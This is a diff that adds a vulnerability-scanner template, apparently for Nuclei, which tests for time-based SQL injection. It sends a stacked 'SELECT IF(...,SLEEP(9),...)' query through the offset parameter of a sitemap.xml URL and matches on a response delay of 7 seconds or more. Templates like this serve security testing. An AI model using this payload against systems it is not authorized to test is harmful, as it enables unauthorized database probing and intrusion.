@@ -1,0 +1,17 @@
+id: SQLI time based 
+
+info:
+  name: SQLI time based  
+  author: vishwas
+  severity: critical
+  tags: fuzzing
+
+http:
+  - method: GET
+    path: 
+      - "{{BaseURL}}/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=7'
